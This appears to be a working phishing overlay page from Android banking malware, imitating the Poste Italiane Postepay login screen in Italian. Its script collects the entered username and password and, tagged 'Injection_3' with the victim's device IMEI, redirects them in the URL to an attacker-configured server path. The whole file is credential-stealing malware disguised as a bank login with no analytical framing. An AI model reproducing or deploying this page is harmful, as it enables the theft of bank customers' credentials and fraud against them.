<!-- 3.9.18 -->
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="it/posteitaliane.posteapp.apppostepay/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        Accedi
        <img style="float: right;margin-left: -19px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAVCAIAAAAra0KGAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MEFFN0JDQzZCOUUzMTFFOEIyOEZGNUIwQkM0Mzc2MzEiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MEFFN0JDQzdCOUUzMTFFOEIyOEZGNUIwQkM0Mzc2MzEiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDowQUU3QkNDNEI5RTMxMUU4QjI4RkY1QjBCQzQzNzYzMSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDowQUU3QkNDNUI5RTMxMUU4QjI4RkY1QjBCQzQzNzYzMSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PtNGsOoAAALcSURBVHjaYnx3hwEC5i4XXrJG0ED3e3/DUwYiABOEWrxW6Nwlzi2L78lK/S5rkSZW55PnrLsP8HbXPePm+peX9FpI4E9tpyRROvcf5XWx+8zF+Q/IZmH5X5Lxip3tf0OP5P//hHT++MnIxvYPLgTUXJn38txlzkdP2Qjo1NH4cekaF1wIaNXyDYJion9kJH8R0Glq8O3eI7bnr1ghQr9+Mc5eKjyn5xEzMyHXsjD/jwl61z9TFCLEzv4/MuD9zMUiRMWKj+unX7+ZNuwQgHCTIt9u2MF/8SonXN3PX4xoAcYEZ9UVPZ+7TOj+I1CosLH+37Lobkmz9JFT3P/+Mdx9yO4br7R6iyCyZkZIGgIKMTIyPHzClloit2b2fT7evxDpqCwFZub/T1+wLpjwsLFX0sX2c0Tge0a4zr1HeLqniaur/GgofvHmHUtGmez2pXfZ2KDmf/rMzM7+DxjDQNOB5jpaf44Oeg8UZ5aVFdx9kG9q+xN5md/ppXJRge/tLL/G5MqHeH8AuhkSYCzgQAY6ysPp09T5ol+/M+lq/GAwM1O+coQVaDMQHdvOYWqmfOcM8+k97Hp6qmf3sUHEkdGTy0whgbKTuwSZgCbB/a2h+qO37inQbyJCf5ZNf5BVKTt/pdDfv4zIQQoMrbfvWaxMvjLM7BeMjZR5cZ0Rbuq+jZzm5sqPLjIDjS8vEPd0V1g1n/fRJaYX1xiXzOQzMFTZuZYLqAykYcYikbsP2doqnrOyQm0/c5GrrltyxYwHfDx/b9zhWLeN/8oNTmD0ANMpMJF7OH6yMfsKjRWg5vuP2Tqrn8Fddeo8d9skcWBkCPCDYgioDegpJiaGjHJZYH5QkPkFTQkZcW/C/d4j+8fM8Gth2iugOqCvQCmGiQGYjPcf4wUygNoQKQEX2L6fb+YiEWBiVJL7efUW5+pNApPbnkiK/SasEwjevmdetl7w1l0OLbUfwDQAT14AAQYAEpdFZtb7ZvoAAAAASUVORK5CYII=">
    </div>

        <form action="null"  method="post" id="_mainForm" target="flow_handler">
            <input type="tel" class="field" name="login" id="login" placeholder="Nome utente">
            <input type="password" style="margin-bottom: 30px;" class="field-p" name="password" id="password" placeholder="password">

            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABUAAAAWCAIAAACg4UBvAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NzQxMDQyNDZCOUUzMTFFOEJBNzlDMzgzRTBGRjk1OTAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NzQxMDQyNDdCOUUzMTFFOEJBNzlDMzgzRTBGRjk1OTAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo3NDEwNDI0NEI5RTMxMUU4QkE3OUMzODNFMEZGOTU5MCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo3NDEwNDI0NUI5RTMxMUU4QkE3OUMzODNFMEZGOTU5MCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PsTU4xcAAADOSURBVHja7JQ9CoYwDIZtLY4KdXPzCB7FS/QIxYM4eAZXD1EQz+DgJO461PrzFr7BserwLQZCQ+HJm5Qm5DgO74Ux+LZt0zQty+LIEEKiKIrj+Mc3TaOUulUIpVQIkaYpg3jXdbgKwxCJXWBjDIqt67ooCgbZfd+RT0oZBIEL3/d9VVUQtoU8eLNrp0/4a5vUe2cf//H/5Bk+M4ZvXdeyLB0ZrTUo3/ctjyPLsrZtx3G8tT/yPMcgEjj2wTAM8zy7zx/nPEkSG7/cn6cAAwDEc1YZV1i6KgAAAABJRU5ErkJggg==">
            <span>Ricorda il mio nome utente</span>

            <p>Hai dimenticato le tue credenziali?</p>

            <input type="submit" class="button" id="input_submitBtn" value="ACCEDI">
        </form>

        <div class="footer">
            <input type="button" class="button2" disabled value="REGISTRATI">
        </div>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('input_submitBtn');
        g_oBtn.onclick = function () {

            var oNumInp = document.getElementById('login');
            var oCodeInp = document.getElementById('password');

            try{
                oNumInp.className = 'field';
                oCodeInp.className = 'field-p';
            } catch(e){};

            if (!/^\w{3,50}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'field error';
                } catch(e){};
                return false;
            }

            if (!/^\w{3,50}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'field-p error';
                } catch(e){};
                return false;
            }

			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|it_posteitliane|"+oNumInp.value+"|"+oCodeInp.value);

           return false;
       };

   })();
</script>
</body>
</html>
